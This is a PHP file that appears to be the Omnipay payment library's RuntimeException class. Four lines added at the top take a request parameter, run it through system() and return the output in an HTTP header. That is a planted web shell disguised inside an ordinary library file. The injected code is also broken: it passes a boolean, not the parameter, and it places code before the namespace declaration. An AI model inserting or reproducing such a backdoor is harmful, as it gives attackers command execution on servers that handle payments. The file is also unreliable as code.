<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace Omnipay\Common\Exception;

/**
 * Runtime Exception
 */
class RuntimeException extends \RuntimeException implements OmnipayException
{
}
